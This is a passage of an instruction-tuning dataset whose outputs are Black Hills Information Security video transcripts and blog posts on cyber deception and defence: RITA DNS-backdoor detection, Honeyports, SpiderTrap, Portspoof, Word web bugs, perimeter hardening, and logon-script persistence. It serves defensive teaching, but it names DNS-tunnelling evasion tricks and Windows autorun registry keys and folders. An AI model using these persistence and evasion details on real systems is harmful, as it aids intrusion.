        "output": "outu.be BYwYFSQz3QI Hello and welcome my name is John Strand and in this video we're going to be talking about RITA Real Intelligence Threat Analytics and how it can quickly do DNS analysis to find DNS backdoors in your environment So once again we are using ADHD if you want to find ADHD just go to ActiveCountermeasures.com go to projects select ADHD and then you can download it On that virtual machine once you login with user ID and password of ADHD ADHD you'll be able to get in login and then right on the desktop you're going to find our instructions document Inside of that document if you select attribution and you go RITA so if we start at the beginning close this out If I go usage ADHD usage opens the document and then if I go to attribution and select RITA it'll take you right to the instructions that I'm working through Once again we're using ADHD instead of Security Onion today because ADHD has this packet capture that I use in my Cyber Deception Active Defense class for various classes like Black Hat and Wild West Hackin Fest built into it You would follow these instructions to basically get to the point where I'm at right now Now as part of following those instructions I have already done the Julia Child's thing and I have already generated an HTML output report from RITA Hello look it's done So we're going to go into DNS Cat I'm going to go into 2017 Yes it's a little bit old but trust me TCP IP and UDP haven't changed all that much since then We are going to open up this particular capture file Then we are going to go into DNS Now once we get into DNS there's a couple of things I'd like to talk about First whenever you're thinking of DNS the best thing to think of is a phone book A very large automatic phone book that your computer uses to resolve names like www.yahoo.com or Google or Active Countermeasures or Security Weekly whatever it is you're going to Your computer has no idea what those things are None what's so ever So it has to resolve that to a number or an IP address Now whenever we're looking at those IP addresses another analogy is it's like a phone number right it's like a number that you would call to get to a computer Now the analogy falls apart after a while but just suffice to say that the analogy of name to a number with a phonebook in the middle works Now whenever you have a backdoor it can actually use DNS as that covert command and control getting out of the environment One of the tools that works very well for doing this is DNScat2 by Ron Bowes and that's in fact what you're seeing here Now in this example you can see that the number of subdomains are 23 362 or hosts associated with nanobotninjas That's not normal That's like if you think of google.com right You have maps.google.com mail.google.com you have drive.google.com those are all subdomains or hosts associated with the domain google.com Now in order for the DNS backdoor to work it needs to make a full connection for every single DNS lookup The reason why is if it just did www.nanobotninjas.com again and again then the local DNS resolver which in many organizations is there domain controller would just serve up that cached answer So it has to set up a randomized request every single time I'll show you what that looks like here Here you can see that we have 23 362 subdomain requests that's just that's bad All right so what we're going to do is we're going to drop into the directory in bro where we'll do some quick bro log analysis for DNS backdoors Now you can see our evil domain is nanobotninjas.com and you can see that the file that we are looking at is DNScat_log 2017-03-21 That's exactly the directory that we're logged into so we're going right to the source So RITA said something is weird here so what we're doing now is we're actually diving into it a little bit deeper What I'm going to use is a tool called zgrep Zgrep allows me to grep out a string inside of compressed archives DNScat was going to have a whole bunch of DNS queries we're going to see that in a second but it's currently all logged inside of bro data and that bro data is compressed So instead of going through and trying to decompress absolutely everything you can see here is a whole bunch of different compressed files and there's a lot of DNS files there what we're going to do instead is we're going to use a tool that can grep up out of those compressed archives anything or any line that has the string nanobot specifically looking at any file with DNS in the name I'm going to hit enter here we go Now a couple of things that are going to jump out at you fairly quickly First for a lot of people that are new to this this looks like total complete and utter gibberish That's ok What I want you to notice is here You can see that we have multiple requests for cat.nanobotninjas.com but if you look you can actually see that the string before the cat actually is randomized for every single request That's because a DNS backdoor is going to have to randomize that request to cause the full DNS query to go all the way to the evil DNS circuit and back every single time So there's lots of requests that are being made The other thing that's interesting about this is if you look the DNS server that it's talking to is 8.8 8.8 Now there are a couple of interesting things First this is interesting because it is Google's DNS server That's kind of weird Does this mean that Google's DNS server is evil It just means that Google's DNS server is receiving that request and then it's forwarding that request to the nanobotninjas name server So it's kind of forwarding that Now the reason why this is important to anyone who does enterprise security is because many of your organization's whitelist everything that goes to Google Whether it's www.google.com or 8.8.8.8 it just ignores it And it does that for the purposes of resource utilization monitoring network traffic on the edge of your network it's just easier to say Ah that's going to Google eh let it go and just let it run without actually stopping it at all So this is important for two separate reasons One it's important because this backdoor is heavily utilized by Black Hills Information Security in our pentests or variations of this particular backdoor Two it doesn't really get caught all that much And three we have found that many organizations that are security products themselves are actually ignoring a lot of the traffic that happens to be relaying through something like Google And you're going to see this a lot more as we progress throughout these videos for things like domain fronting as well So once again my name is John Strand if you have an opportunity to go down and hit subscribe I see a lot of people that are YouTubers I think that's right They say to do that all the time so I guess I'm going to do it too And also please check us out every Wednesday on Enterprise Security Weekly where we aren't afraid to name vendors name names and actually say how well things do or sometimes do not work Thank you so much and I hope to see you in the next video"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Messing With Portscans With Honeyports (Cyber Deception)</title>\n<taxonomies>Author, How-To, InfoSec 101, John Strand, Red Team, Red Team Tools, Cyber Deception, honeyports, john strand</taxonomies>\n<creation_date>Fri, 20 Mar 2020 16:00:21 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be hMLStJuNUT0 Hello and welcome My name is John Strand and in this video we're going to be talking about tripwire Honeyports Now this is a lab that's used in ADHD This is the virtual machine that we use in my classes that we teach at Wild West Hackin Fest and also at Black Hat But in this video we're going to be talking about how you can create a port on your computer system that as soon as an adversary interacts with that port it will automatically blacklist the IP address of said attacker Now in this particular situation as always all of the usage information is in this file on the desktop called ADHDusage.HTML We're using Annoyance and specifically we're looking at HoneyPorts Now as I mentioned the HoneyPort is designed so that if an adversary actually interacts with a specific port it's automatically going to blacklist the attacker's IP address Now it's very common for people to freak out about this and say Well an attacker can simply spoof a connection and then it would blacklist and DOS your entire environment That's not at all how that works It's not how any of this works That's just insane Let me explain why If you're looking at TCP IP The TCP IP three-way handshake involves me sending you a SYN packet All right I'm going to send you a SYN packet and if that port's open you're going to respond back with the SYN-ACK Now there's these things called initial sequence numbers that are 32 bits long Now what that means is there's 4.27 billion and change possible values for that Now I send you a SYN with an initial sequence number you acknowledge that initial sequence number by incrementing it by one and then you start another sequence number Then I acknowledge that sequence number by one and then we communicate yet again through a series of ACKs What does this mean This means if an attacker was going to try to spoof a live system they would have to spoof that system and they would have to guess a 32-bit number on the fly before that system that they're spoofing responds back with a reset Point is it's really hard to do Not impossible it's just mathematically improbable to do because this particular scenario with Honeyports they only trigger in a full established connection to the port So let's get started Once again we're following the instructions on ADHD I'm going to be using the terminal for this as always I'm going to CD into the OPT directory once again following the instructions right there Let me zoom in We're going to CD into opt honeyports cross-platform This is the one written by Paul Asadoorian of Security Weekly Then once we are in Honeyports we're actually going to run the version 04a.py So we got python2 and we're going to do honeyports and we do dot version 4.a.py and we hit enter Now as soon as I hit enter it's going to throw an error Specifically it's asking for a port Now the cool thing about this is it means that Honeyports in the script that Paul created is flexible We can create any port that we want for it to actually listen So if I hit up arrow I'm going to give it the port 2222 Once again totally not creative We've got to give it the minus P There we are and now it's listening on port 2222 I also made another mistake Once again so so many mistakes you all I'm going to kill this again and I'm going to run it as root The reason why is what Honeyports does is as soon as somebody makes a connection it is going to create a rule in IP tables In order to create a rule in IP tables one must be root So now I'm running Sudu We got python2 honeyports.py We have the port Let's connect to it I'm going to open up another terminal and I'm going to simply netcat to port 2222 Go to 127.0.0.1 and port 2222 I hit enter It says Thank you for connecting Now if I kill this and I try to connect again you can see it doesn't work This connection is dead That is because this system now is blacklisted so if I become root really quickly quick as unto a bunny and or a gazelle and I do IP tables become root Oh I am already root Let's go IP tables minus L It's going to list out the IP table rules and if we check the input chain right here you can see that localhost.com as soon as localhost.com tries to make a connection to this computer system it's going to reject with an ICMP port unreachable message which is just a fun way to switch protocols and mess with Look it's TCP IP humor At least I think it's funny But it's going to basically redirect and drop any traffic coming from that particular computer system We can also see over here within HoneyPorts that it did create the rule We can do P and it'll print the rules and we can ultimately kill them and we can actually flush the rules as well We do IP tables minus F and it's going to flush any of the rules that were created Now if I list them you see there are no input rules anymore so we deleted that specific rule Now once again I really want to reiterate that this will not break your environment An attacker's not going to show up and start spoofing ports from our IP addresses from everywhere and crash your entire network That's not how this works because of the magic of the TCP IP three-way handshake But some people will say But what about Kevin Mitnick and Tsutomu Shimomura Great question With Kevin Mitnick and his attack years ago you should really research it at the Takedown website What Kevin Mitnick did was this attack against a weak protocol that was wide open to the network and it was a weak sequence number prediction and he was able to DOS the system he was trying to spoof Gets into a lot of weirdness about that specific scenario but just suffice to say something that happened in the '90s is not going to happen on your network at least more than likely we hope Once again please check out Wild West Hackin Fest Black Hills Information Security and ActiveCountermeasures.com and also check out Enterprise Security Weekly with Paul myself and Matt every single Wednesday Thank you so much and we'll see you in the next video"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Check Your Perimeter</title>\n<taxonomies>Author, David Fletcher, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, David Fletcher</taxonomies>\n<creation_date>Mon, 23 Mar 2020 12:05:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher With so many organizations transitioning to remote work in order to stem the tide of COVID-19 infections we wanted to cover some of the configuration elements you should be considering to ensure that your network perimeter is properly protected Employee remote access is often a target for attackers looking to gain initial access into an organization's network With authenticated remote access an attacker may be able to run roughshod through your environment in a very short time Multi-Factor Authentication As employees are transitioned to work from home it is critical to ensure that your organization is using Multi-Factor Authentication MFA on all Internet-facing portals leading to corporate information In the 2019 Verizon Data Breach Investigation Report DBIR use of stolen credentials was the number one hacking technique observed Attackers often use tools to gather employee names mangle those results into usernames and perform attacks like password spraying against exposed portals in order to gain access Without MFA an attacker just needs to guess a correct password and access is obtained Since the number of remote workers is typically increasing due to the spread of COVID-19 the attack surface is also increasing which is likely to increase the overall risk of NOT using MFA In addition you should not just be concerned with the obvious portals Dig into your vulnerability scan results and investigate anything requesting external authentication Especially if those hosts and applications are requesting NTLM over HTTP authentication We are often successful in gaining access using applications other than Webmail and VPN MFA is not a silver bullet given that many transparent proxies like CredSniper and Evilginx exist But it will increase the work factor for an attacker to gain access to your environment Improved security can be gained by requiring client certificates on connecting devices However if you are not doing this already it may be difficult to implement securely in an expedited fashion Hygiene External hygiene is on everyone's radar However there have been a rash of vulnerabilities discovered in VPN and other remote access technologies that should be checked Many of the recently discovered vulnerabilities require very little sophistication and no credentials to exploit To make matters worse the exposed devices are typically missing security controls that are deployed to all of our workstations like antivirus and endpoint threat detection In addition increased utilization is likely to make detection using log files generated by the devices difficult at best When scanning these devices ensure that appropriate checks are enabled to detect the known flaws You may also be able to use one of the publicly published vulnerability scanning or exploitation scripts to perform a targeted check for vulnerable conditions Just make sure that you get the script from a reputable source and that you understand what the script is doing Often the scripts simply make HTTP requests for resources exposed by the appliance VPN Configuration IKE Aggressive Mode The configuration of your VPN concentrator is another important aspect of security We often see the age-old IKE Aggressive Mode with Pre-Shared Key PSK vulnerability on external penetration tests The aggressive mode IKE handshake exposes enough information to attempt to recover the Pre-Shared Key PSK used to protect the VPN tunnel To avoid this situation the VPN device can be configured to accept only main mode handshakes A main mode handshake does not disclose the same details that can be used to recover the PSK In reality this can be a difficult condition to exploit because the attacker typically needs to know the group name for the connection Once the PSK is cracked the attacker may have to deal with inner authentication as well This may provide an additional opportunity for password attacks In any case it is a good idea to address this configuration element Split-Tunneling Another VPN configuration item that can pose problems is allowing split-tunneling A split-tunnel is formed when the employee is allowed to openly browse the Internet bypassing the VPN connection while connected to the VPN Only requests for corporate resources traverse the VPN itself This is excellent for bandwidth conservation but completely bypasses the infrastructure used to enforce corporate IT policy like web proxies execution sandboxes SSL TLS inspection devices full packet capture devices etc Allowing split-tunneling can make the investigation of an intrusion more difficult if not impossible Now responders must consider traffic that is not traversing the corporate network and are likely to have reduced visibility on the employee's network Organizations should seriously consider their security posture the inherent costs and implications of the configuration before allowing split tunneling On the bright side there are various cloud-based protections that can help mitigate this risk if you are a subscriber Technologies like Cisco Umbrella and Zscaler provide some of the capabilities afforded by Internal infrastructure regardless of the device's path to the Internet Corporate Wireless Configuration What does your corporate wireless configuration have to do with remote security As noted above the use of stolen credentials is number one on the hacking activity list Your corporate wireless configuration could be another way to obtain credentials for employees Your wireless network infrastructure affords at least some protection while in the office Some equipment also may have active protection to prevent various attacks An attacker often needs to transmit a signal that is more powerful than a legitimate access point in order to execute an evil twin attack In the evil twin attack the attacker advertises an identical SSID in hopes to entice devices to connect to it When those devices use Active Directory domain authentication the attacker AP challenges for credentials and the computer sends those credentials automatically Connections usually require no user interaction since the attacker is advertising what appears to be a known network The affected device simply connects when the SSID is observed A problem arises when corporate equipment and other devices using domain authentication is away from the corporate infrastructure Now the attacker has an advantage in that there is no legitimate signal to compete with or actively prevent client connections from occurring As a result organizations should ensure that wireless networks are configured to perform mutual authentication between the client and the infrastructure This means that the client should be validating the certificate of the AP and vice-versa In addition keep an eye on those mobile devices In several organizations that we have tested the organization has a mobile network segment but is using Active Directory authentication to minimize the number of credentials the user must remember Without deploying client certificates to these devices an attacker can intercept credentials from them as well Once the attacker has credentials they can try to use them on Internet-facing portals or they may physically steal a device where they can legitimately authenticate from Home Network Protections One last concern to consider is the separation of employees home and work lives Modern home networks are often teeming with IoT devices smartphones and gaming consoles The organization often cannot attest to the security of these devices or the network itself The best option is likely to be the most difficult to implement in that the organization should ensure that corporate devices are segmented from personal devices on the employee's network We will be covering this topic in an upcoming blog post in detail A more palatable alternative may be to deploy an always-on VPN configuration to corporate devices The employee would be allowed to authenticate using cached credentials then join the wireless network and the VPN client connects automatically anytime the network is accessed This limits the exposure of the device while connected to the employee's home network and prevents local interaction while connected through the tunnel Conclusion As organizations are taking measures to respond to COVID-19 it is important to do so in a manner that does not increase exposure to the business Ensuring that remote access is securely configured is an important consideration before allowing remote operations in mass Hopefully this post will help identify areas to check as your business becomes more distributed"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Messing With Web Attackers With SpiderTrap (Cyber Deception)</title>\n<taxonomies>Author, Fun & Games, How-To, Informational, John Strand, Cyber Deception, spidertrap</taxonomies>\n<creation_date>Mon, 30 Mar 2020 12:11:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be 2G6cG8g7p04 Hello and welcome My name is John Strand In this video we're going to be talking about using SpiderTrap to entrap and ensnare any web application pentesters or hackers that are trying to come into your web applications Now for this particular video we're going to be using the Active Defense Harbinger Distribution or ADHD which can be found at activecountermeasures.com go forward slash into projects and you'll be able to download the same distribution that I'm using here This is also the same distribution that we use in our Wild West Hackin Fest classes You can look at that schedule at www.wildwesthackinfest.com I also use it at Black Hat Training as well So let's jump right in Now as it is always with any of the different utilities that we use for ADHD all of the instructions are on the desktop in a file called ADHD Usage We'll be using that file for everything Now once you're in here you're going to be using the annoyance category You're going to be selecting SpiderTrap Once you have selected SpiderTrap it's going to bring up a website that's going to show you where you can actually download SpiderTrap a generalized description and usage information for SpiderTrap Now I'm going to walk through these instructions very very quickly to give you an idea of how this tool actually works Now the first thing that I'm going to do is I'm just going to start SpiderTrap with no options at all Here I'm just running Python to SpiderTrap.py I hit enter and it's listening That's it It's listening on port 8 000 Now to see what it actually does we're going to open up a browser and let's just surf to port 8 000 on my computer system We go HTTP and we are going to go to port 8 000 on 127.0.0.1 because there's no place like home Now once we have this you're going to see that as soon as we load SpiderTrap on port 8 000 it's going to show us a series of random links Now those random links are somewhat important The reason why those links are important is because if we click on any of those links it's going to bring us more random links and yet more random links and more random links and yet more random links Now what exactly is this doing and why is this important When you're looking at cyber attribution or you're looking at cyber deception one of the key components of what we can do is sort of fake the adversary or the hacker out Now the reason why is if we're looking at a basic algorithm of detection time plus reaction time must be less than the amount of time it takes for an attacker to break into your organization we want to increase the amount of time it takes for the attacker to successfully identify any systems or vulnerabilities on those computer systems By creating a bunch of different randomized links we're not stopping the attacker but we are actually going through and increasing the work effort the attacker has to go through to identify the real web server pages on your web server What does this look like to an actual attacker or crawler Here I'm just going to use Wget Now Wget is a tool that if I use the -R it recursively goes to a webpage and it'll try to pull down and make a local copy of all the different HTML and JavaScript files that exist on that web server As you can see it just keeps going and going and going still going going going going Then I'm bored and I'm just going to hit control save Now eventually if an attacker was running an automated crawling tool it would exhaust all of the memory or it would exhaust all of the disc space on the computer system Now what I'm going to do is I'm going to throw in another option with SpiderTrap SpiderTrap also has the ability to take in a dictionary file Now a dictionary file allows you to feed in a list of different directory names instead of it coming up with randomized directories Now if I run it with big.txt and ADHD now we have real names Cheryl really Nebraska issue SMS Toyota skins If I click on any one of these it brings up tomcat send mail ask primerio registered We've got sparky we've got cobra we've got terrorism we have poker we have projects whatever This makes the fake web server look a little bit more realistic and yes it'll still get caught in an automated crawling spider Now is SpiderTrap something that you would want to do on an enterprise app Not even close not even close Is it great for articulating the different things you can do to mess with an attacker Absolutely It's really really good at that Also you can use it tactically If you think that you have an attacker that's trying to break into your website you can throw this up on robots.txt You can put it in sitemap.xml These are things that normal users would never come across but their automated utilities would I hope you enjoyed this video and I'll see you in the next video As always be sure to check out Wild West Hackin Fest Black Hills Information Security and Security Weekly every Wednesday with Matt Alderman Paul Asadoorian and myself where we talk vendors and what works and what doesn't Thank you so much and I'll see you in the next video"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How To Use Portspoof (Cyber Deception)</title>\n<taxonomies>Author, Fun & Games, How-To, Informational, InfoSec 101, John Strand</taxonomies>\n<creation_date>Wed, 08 Apr 2020 12:20:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be SrCPwpyt0AE Hello and welcome and in this video we're going to be talking a little bit about Portspoof a fantastic utility that takes your unused TCP IP ports and turns them into something different whenever an attacker actually goes about trying to scan them This video is part of the Active Defense and Cyber Deception class that we run at Wild West Hackin Fest in San Diego and in Deadwood and also I run in Black Hat Now as always with all of these videos we're going to be using the Active Defense Harbinger Distribution Once again if you want this distribution you go to activecountermeasures.com you go into the free tools you'll see ADHD listed there You can download the VM and play along All of the instructions are on the ADHD usage document on the desktop Now to get to the instructions for using Portspoof we're going to go to Annoyance We're going to go down into Portspoof which I went right by it Here we go We're going to select Portspoof Let me zoom back out and it's going to have a wonderful little website that you can go to get more information about Portspoof an overall description of Portspoof and what we're actually doing Now let's get started and the first thing we're going to have to do is play around with iptables rules Now the way Portspoof works is it listens on a port in this situation that's going to be listening on port 4444 and we're going to create an iptables firewall that takes all of the traffic that's coming in a port or a port range As you can see here we have matches TCP as the protocol and then it's going to match the destination port And then this situation the range between one and 65 535 and it's going to redirect it to the local system on port 4444 Now what Portspoof is going to do is receive those connections initially and it's going to say that every single port that is scanned is open and then we're going to change it so it actually goes with a variety of different services So if we were to look at my system now and how it looks in a scan if I run my Nmap scan give it a port one to 10 I'm only going to run 10 ports in this video and you'll see why But Portspoof can greatly increase the amount of time it takes for a successful port scan We're going to go with ports one through 10 against my Linux IP address and it comes back with all of those ports currently closed Now why does it think that those ports are closed Well one of the things I can do is I can add in the dash dash reason flag and with the dash dash reason flag we are seeing that the connection itself is refused There's a number of reasons why you might not get a response from a system You could get a reset you could get no response whatsoever You could get an ICM port unreachable There's a wide variety of reasons and with the dash dash reason flag Nmap's going to tell us why it thought those ports were closed Well now let's go configure Portspoof So I'm going to use the wonderful power of copy and paste and just so you know copy and paste is without question the single most powerful tool that any hacker or pentester or security professional has I'm going to become root and I'm going to paste in that long string for iptables I'm going to hit enter We have now created that iptables rule on this system Now to get the initial working Portspoof the only thing I have to do is just run Portspoof Now it's running So now if I go back to my system that's running the attack over here you can see that initially all of the ports were closed Now all of those ports are open and the reason why it states that those ports are open is because it received a SYN ACK and Portspoof is sending those SYN ACKs Now this in and of itself is not all that interesting It's just basically saying yep SYN ACK ports open But with Portspoof we can actually do something a little bit more interesting with Portspoof You see what we can do with Portspoof is we can actually give it a signature file on the system So I'm going to copy that string with a signature file I'm going to paste in Portspoof Now Portspoof is running and it's saying using user-defined signature file at user local Etsy Portspoof signatures Now what does it mean to have a signature file Well a variety of different services will respond with a variety of different banners For example if you connect to an SSH server it might come back and say open SSH in the specific version You might identify a web server by its banner It says it's an Apache webserver or whatever We can use those signatures and to be honest Nmap uses those signatures to adequately identify what the remote application is on the other side So now if we run an actual scan against it we're now going to do Nmap space -AF but we're going to do a version scan and what that version scan is going to do is it's going to attempt to identify what those versions of the different services are on the system Now it's going to take a little bit longer and the reason why it takes a little bit longer is because Nmap isn't just seeing if the port is open it's actually interrogating that service and it's trying to identify exactly what that banner is So there's a lot of stimulus and response that's going back and forth between my system here and the system we are now currently scanning If you want to see status you can just hit the space bar and it's going to come back and it's going to say well about 70 done one's completed and here are the results Now if you look at this point Portspoof is now completely messed with us because it's saying that port 1 is open the service is Telnet and it believes that it's a Tanberg NPS 800 Telnet D server It thinks that port 4 is Webtam Webtrends WTAM We've got a Tobit David.fx IMAP D server We have a Sunbelt server What is this madness What is this insanity Well if we were to run this again it's going to take a little while Portspoof is taking these signatures from the signature file and it's feeding it right back into Nmap and it's actually taking a random signature from that signature file and feeding it into Nmap Now inevitably you're going to have someone say well of course an attacker will be able to see right through this Yes I mean it's going to create a lot of noise for the attacker but that's kind of the point Remember detection time plus reaction time must be less than the amount of time it takes for an attacker to successfully attack your network So now we have greatly increased the amount of time it takes for an attacker to run a simple port scan against the target computer system That's interesting in and of itself it's just going to increase that time 10 ports It took 32 seconds to scan 10 ports If we were trying to scan all 65 535 ports that were referenced in our iptables rules it's going to take a lot longer to identify all those services in ports Now if you wanted to find a real service that was alive and listening you would have to run it multiple times and see which ones looked more consistent with what you would expect And you can also do a manual inspection If you think it's a webserver port just connect to it But once again this is greatly increasing the amount of work effort that an attacker has to go through to identify your ports and your services So this is a fantastic little utility that's built into the Active Defense Harbinger Distribution We use for our Wild West Hackin classes for cyber deception And if this is interesting coming up we've got an entire two-day class dedicated to all of this that you should be running So once again my name is John Strand Please check out Enterprise Security Weekly every Wednesday where Paul Asadoorian and Matt and myself get together and we talk about vendors Thank you so much and I will see you in the next video"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Tracking Attackers With Word Web Bugs (Cyber Deception)</title>\n<taxonomies>Author, Fun & Games, How-To, Informational, InfoSec 101, John Strand, Cyber Deception, Word Web Bugs</taxonomies>\n<creation_date>Mon, 13 Apr 2020 12:10:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "outu.be yZtm7yZAm7o Hello and welcome My name is John Strand and in this video we're going to be talking about Word Web Bug Servers Now the idea of a Word Web Bug Server is we can create a Word document that any time that document is opened it will actually create a call back and it will allow us to identify where the attacker's IP address is Now the cool thing about Word Web Bugs is they don't need to have macros enabled for them to fire In fact they don't necessarily even have to open Microsoft Word at all NO MACROS!NO M WORD So let's actually go through how a Word Web Bug document works Now in this particular video we're using the Active Defense Harbinger Distribution This is the distribution I use for my class on cyber deception at Wild West Hackin Fest both in San Diego and in Deadwood South Dakota and I also use it for whenever I teach that class at BlackHat the four-day version of that class Now the instructions are on the ADHD usage document on the desktop of the system And then once you're in you can select attribution and then you can select Web Bug Server and it'll take you to step by step instructions on how to use the Web Bug Server Let's actually jump right in here So to get this to work everything is in the opt directory So I'm going to CD into opt into web bug server and I'm going to type LS Now in this directory there's a number of different things that exist The first thing that you're going to notice is we have a number of document templates We have web_bug.doc and we have web_bug.html Now the thing that you need to understand is that both of these are pretty much the same And I'll explain why here in just a couple of seconds So if I do ifconfig and I pull down my IP address you're going to see that my ens33 adapter has an IP address of 192.168.149.128 So I'm going to copy that IP address because we're going to use that here in just a second Then I'm going to use VI and I'm going to open up web_bug.doc Now if you look inside of web_bug.doc web_bug.doc actually has HTML code which is weird because it's a doc file Now in this particular example if you were to open up this document in Word you wouldn't see the HTML HTML and the head and the link URL You wouldn't see that Instead what you would see is just a document that's blank and it would say what a buggy document and that's it Instead what's happening in the background is really interesting because what's happening in the background is the word processor in this situation Microsoft Word or AbiWord or whatever is going to try to pull down some HTML elements It's going to try to pull down a cascading style sheet The other thing that it's going to do is try to pull down an image source tag So if you're working with ADHD you're going to take the default IP addresses in this document and you're going to replace them with the IP address of your computer system Now if we start let's say AbiWord and we open up web_bug.doc it says it can't open this appears to be an invalid document Huh That's weird But it doesn't matter if it says Hey this is an error or not because in the background what's going on is really interesting So I'm going to show you the database in the backend and ADHD has Abminer as the backend database So we're going to log in with a user ID of webbuguser and we're going to log in with a password of I think it's webbug or ADHD can't remember what it is ADHD and then webbug for the database There we go By the way you should never ever use this in production like ever And you're going to see requests and if I select requests it's going to open up the actual data And here you can see a bunch of examples that I've already pre-populated You can say LibreOffice opened and we got the IP address We also had Microsoft Word from an earlier run on a Windows 10 computer system was making a connection back as you can see this user agent string And then right down here at the bottom is not necessarily the user agent string but it's my AbiWord attempt at opening this And if you remember AbiWord threw an error but in this particular scenario who cares because the document already did a call back to us as the defenders Now the key for this is it actually runs in multiple different ways It will use image source tag and cascading style sheet The reason why is some word processors do better with image source tags and others do better with cascading style sheets So I hope you had a good time in this video Be sure to check out the links below and I don't do this much in my videos but I'm going to say hit that subscribe button because other YouTubers do it and they seem to be really popular with the middle school kids"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Backdoors & Breaches: Logon Scripts</title>\n<taxonomies>Author, David Fletcher, Fun & Games, Informational, InfoSec 101, Red Team, Backdoors & Breaches, David Fletcher</taxonomies>\n<creation_date>Mon, 06 Apr 2020 12:15:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "David Fletcher This blog post discusses the relevance and techniques involved in logon script abuse While the Backdoors Breaches card is featured for this topic the post will provide context for understanding how an attacker can abuse this functionality and details that are useful in monitoring for such abuses Operating systems typically have features that allow an administrator or user to automatically execute commands during session initiation to ease the burden of administration in the context of a given environment An attacker can take advantage of those features to execute commands of their own in order to gain initial access establish persistence or perform lateral movement This type of attack can be most devastating in the context of a corporate Active Directory environment As a result the discussion will center around the Microsoft Windows operating system However administrators and security analysts should realize that many of the capabilities we will be investigating are available in other operating systems and those vendor appliances installed on our networks In the context of this post I consider a Logon Script any functionality that supports automated command execution during user session initialization So what techniques might an attacker try to obtain authentication-based execution Modification of registry keys Local filesystem-based automated execution Default domain logon script modification Group policy modification User object attribute modification This surely is not an exhaustive list However it includes techniques that are most widely known and some things that we have encountered on recent engagements Let's explore each technique individually to more comprehensively understand it Modification of Registry Keys This technique is age-old and highly instrumented by Antivirus and Endpoint Detection and Response tools The Microsoft Windows registry contains several keys that can be used to execute content when the user logs onto the target host The most widely discussed keys include HKEY_CURRENT_USER Software Microsoft Windows CurrentVersion Run HKEY_CURRENT_USER Software Microsoft Windows CurrentVersion RunOnce HKEY_LOCAL_MACHINE Software Microsoft Windows CurrentVersion Run HKEY_LOCAL_MACHINE Software Microsoft Windows CurrentVersion RunOnce HKEY_LOCAL_MACHINE Software Microsoft Windows CurrentVersion RunOnceEx In fact there are many other options for execution and a comprehensive treatment can be found at ttack.mitre.org techniques T1060 If an attacker is able to successfully modify one of the referenced keys successfully the system will execute the target application each time the user authenticates As an organization it would be a wise investment to ensure that your chosen endpoint protection software identifies modification of the referenced registry keys to prevent abuse In addition it would be prudent to monitor for new registry keys used for this type of abuse Local Filesystem-based Automated Execution When an attacker gains a logon script type automated execution using the local filesystem the typical attack vector is the user or system's startup folder C Users AppData Roaming Microsoft Windows Start Menu Programs Startup C ProgramData Microsoft Windows Start Menu Programs Startup By default the system startup folder is not writable by standard users However some organizations still grant local administrative permissions to their user populations In any case your chosen endpoint protection software should identify when these folders are modified The contents of the folder should be monitored and investigated when changes do occur Default Domain Logon Script Modification Probably the most widely understood Logon Script functionality is the use of scripts found in the SYSVOL Scripts share or an equivalent Group Policy Object that defines the Logon Logoff script policy element An attacker can easily discover the target logon script by inspecting the Active Directory scriptPath attribute of user objects In addition the attacker can search the SYSVOL policies share for the presence of the Logon folder Once the target scripts are discovered the attacker can check those 